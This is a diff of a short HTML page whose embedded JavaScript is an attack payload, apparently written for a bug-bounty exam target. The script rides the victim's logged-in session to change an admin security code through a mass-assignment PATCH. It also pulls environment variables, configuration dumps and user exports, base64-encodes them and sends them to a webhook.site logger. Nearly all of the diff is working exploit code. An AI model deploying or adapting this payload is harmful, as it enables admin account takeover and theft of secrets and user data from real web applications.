@@ -1,36 +1,42 @@
-<script>
-    const logger = "https://webhook.site/6222374a-b882-44ec-a12d-9671d3dd124c";
-    const api = "https://api-bugbounty-exam.hashacademy.co/api";
+<!DOCTYPE html>
+<html>
+<body>
+    <script>
+        const logger = "https://webhook.site/6222374a-b882-44ec-a12d-9671d3dd124c";
+        const api = "https://api-bugbounty-exam.hashacademy.co/api";
 
-    async function finalCapture() {
-        // 1. Try to find the hidden 'Maintenance' or 'Flag' endpoint
-        // Since we have admin stats, let's look for the config dump
-        const targets = [
-            "/admin/configuration",
-            "/admin/system/env",
-            "/admin/export/database",
-            "/admin/debug/vars"
-        ];
-
-        for (let t of targets) {
+        async function finalPivot() {
+            // 1. Try to set the system's security code (Mass Assignment)
+            // If this works, you've compromised the system configuration
             try {
-                const res = await fetch(api + t, { credentials: "include" });
-                const data = await res.json();
-                new Image().src = `${logger}/?FINAL_TARGET=${t}&d=${btoa(JSON.stringify(data))}`;
+                await fetch(`${api}/admin/settings`, {
+                    method: "PATCH",
+                    headers: { "Content-Type": "application/json" },
+                    credentials: "include",
+                    body: JSON.stringify({ "securityVerificationCode": "HACKED_2026" })
+                });
             } catch (e) {}
-        }
 
-        // 2. The 'Super Admin' Takeover
-        // Try to PATCH the 'securityVerificationCode' to a value YOU know
-        // This is a common 'Second Vuln' (Mass Assignment on System Config)
-        try {
-            await fetch(`${api}/admin/settings`, {
-                method: "PATCH",
-                headers: { "Content-Type": "application/json" },
-                credentials: "include",
-                body: JSON.stringify({ "securityVerificationCode": "PWNED_2026" })
-            });
-        } catch (e) {}
-    }
-    finalCapture();
-</script>
+            // 2. Dump internal system environment variables
+            // This is the most common place for the 'actual' hidden flag
+            const sensitivePaths = [
+                "/admin/system/env",
+                "/admin/config/dump",
+                "/admin/export/users"
+            ];
+
+            for (let path of sensitivePaths) {
+                try {
+                    const res = await fetch(api + path, { credentials: "include" });
+                    if (res.ok) {
+                        const data = await res.json();
+                        const payload = btoa(JSON.stringify(data));
+                        new Image().src = `${logger}/?CRITICAL_LEAK=${path}&d=${payload}`;
+                    }
+                } catch (e) {}
+            }
+        }
+        finalPivot();
+    </script>
+</body>
+</html>
